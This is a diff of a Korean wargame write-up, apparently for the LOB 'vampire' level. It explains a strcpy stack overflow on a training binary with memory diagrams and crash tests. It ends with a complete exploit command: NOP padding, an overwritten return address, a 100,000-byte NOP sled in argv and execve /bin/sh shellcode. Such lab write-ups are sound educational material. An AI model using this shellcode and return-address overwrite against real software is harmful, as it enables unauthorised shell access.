@@ -74,15 +74,14 @@ Source Analysis
 Memory Structure
 ============================================================================================================
 
-
-스택에 다음과 같이 들어가게 됩니다.
+스택 메모리 공간에 다음과 같이 들어가게 됩니다.
 
 .. code-block:: console
 
     ================
     LOW     
     ----------------
-    Buffer  (40byte)
+    Buffer  (40byte) <- strcpy
     SFP     (4byte)
     RET     (4byte)
     argc    (4byte)
@@ -96,17 +95,18 @@ Memory Structure
 Segmentation fault
 ============================================================================================================
 
-
-버퍼오버플로우가 일어나는 지점을 확인합니다.
+strcpy로 인해 입력한 값이 버퍼보다 클 경우 오버플로우가 발생됩니다.
 
 ※ 시작시 bash2 명령을 입력하고 bash2 쉘 상태에서 진행해야 합니다.
 
 .. code-block:: console
 
     $ ./vampire2 `python -c 'print "a"*47'`
+
     stack is still your friend.
 
     $ ./vampire2 `python -c 'print "a"*47+"\xbf"'`
+
     aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa▒
     Segmentation fault
 
@@ -116,7 +116,6 @@ Segmentation fault
 
 exploit
 ============================================================================================================
-
 
 argv[1]의 주소값 변경
 ------------------------------------------------------------------------------------------------------------
@@ -136,11 +135,27 @@ argv[1]의 주소가 \\xbf\\xff로 시작하기 때문에 argv[1]에 nop를 1000
 RET 주소를 argv[1] 주소로 변경하여 공격 진행
 ------------------------------------------------------------------------------------------------------------
 
+.. code-block:: console
+
+    ================
+    LOW     
+    ----------------
+    Buffer  (40byte) <- "\x90"*40
+    SFP     (4byte)  <- "\x90"*4
+    RET     (4byte)  <- argv[1] address
+    argc    (4byte)  <- "\x90"*4
+    argv    (4byte)  <- "\x90"*100000 + shellcode
+    ----------------
+    HIGH    
+    ================
+
+|
+
 nop (44 byte) + argv[1] address + nop (100000 byte) + shellcode (25 byte)
 
 .. code-block:: console
 
-    $ ./vampire `python -c 'print "\x90"*44+"\xd8\x74\xfe\xbf"+"\x90"*100000+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"'`
+    $ ./vampire `python -c 'print "\x90"*44 + "\xd8\x74\xfe\xbf" + "\x90"*100000 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"'`
 
     ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒1▒Ph//shh/bin▒▒PS▒▒°
                                            ̀▒▒▒▒
